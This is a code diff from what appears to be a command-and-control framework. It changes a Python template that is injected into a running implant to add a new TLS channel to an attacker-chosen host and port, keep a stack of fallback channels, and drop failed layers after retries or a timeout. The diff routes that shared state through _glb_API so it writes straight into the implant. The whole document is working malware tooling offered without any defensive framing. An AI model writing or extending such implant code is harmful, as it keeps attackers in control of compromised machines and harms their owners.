@@ -10,55 +10,55 @@ server/s_modules/transport_base.py — 传输生成器公共逻辑（T7.1/U2/U5�
 
   全部逻辑经注入代码覆盖 _T + 动态设置 _CK 实现，不依赖修改 implant 模板
   （模板 cycle 里 _CK=_K 先于 _T() 执行，_disp 成功连上后把 _CK 设为该层 key）。
+  注: 注入代码跑在任务的专用命名空间里, 所以植入物共享状态(_T/_CK/_UPSTK 等)
+  一律经 _glb_API 读写(写穿透直达植入物), 本任务私有变量才留在自己的命名空间。
 """
 
 UPGRADE_TEMPLATE = '''\
-# --- uplevel: {protocol} {host}:{port} retry={retry} timeout={timeout} ---
 {transport_code}
 
 import time as _tm
 
 def _up():
-    global _UPSTK, _UPFF, _UPDL, _T
-    if '_UPSTK' not in globals():
-        _UPSTK = [(_T, _K, 0, 0)]   # 栈底：部署时直连兜底，永不弹
-        _UPFF = 0                   # 栈顶连续失败计数
-        _UPDL = 0                   # 栈顶首次失败时间戳
+    if "_UPSTK" not in _glb_API:
+        _glb_API["_UPSTK"] = [(_glb_API["_T"], _glb_API["_K"], 0, 0)]
+        _glb_API["_UPFF"] = 0
+        _glb_API["_UPDL"] = 0
     try:
-        t = _nT()                    # 探测：能建立连接（TLS 握手 + 指纹校验）
+        t = _nT()
         t.close()
     except Exception as e:
         return "uplevel failed (rolled back): " + str(e)
-    _UPFF = 0
-    _UPDL = 0
-    _UPSTK.append((_nT, bytes.fromhex({key_hex!r}), {retry}, {timeout}))
-    _T = _disp
+    _glb_API["_UPFF"] = 0
+    _glb_API["_UPDL"] = 0
+    _glb_API["_UPSTK"].append((_nT, bytes.fromhex({key_hex!r}), {retry}, {timeout}))
+    _glb_API["_T"] = _disp
     return "uplevel ok: {protocol} {host}:{port}"
 
 def _disp():
-    global _CK, _UPFF, _UPDL
-    while _UPSTK:
-        fn, key, rtry, tmo = _UPSTK[-1]
+    st = _glb_API["_UPSTK"]
+    while st:
+        fn, key, rtry, tmo = st[-1]
         try:
             s = fn()
-            _CK = key
-            _UPFF = 0
-            _UPDL = 0
+            _glb_API["_CK"] = key
+            _glb_API["_UPFF"] = 0
+            _glb_API["_UPDL"] = 0
             return s
         except Exception:
-            if _UPFF == 0:
-                _UPDL = _tm.time()
-            _UPFF += 1
+            if _glb_API["_UPFF"] == 0:
+                _glb_API["_UPDL"] = _tm.time()
+            _glb_API["_UPFF"] += 1
             drop = False
-            if rtry > 0 and _UPFF >= rtry:
+            if rtry > 0 and _glb_API["_UPFF"] >= rtry:
                 drop = True
-            if tmo > 0 and _tm.time() - _UPDL >= tmo:
+            if tmo > 0 and _tm.time() - _glb_API["_UPDL"] >= tmo:
                 drop = True
-            if drop and len(_UPSTK) > 1:
-                _UPSTK.pop()         # 退出这层 → 切回上一层
-                _UPFF = 0
-                _UPDL = 0
-                continue             # 本轮立即用上一层重连
+            if drop and len(st) > 1:
+                st.pop()
+                _glb_API["_UPFF"] = 0
+                _glb_API["_UPDL"] = 0
+                continue
             raise ConnectionError("channel down")
 
 print(_up())
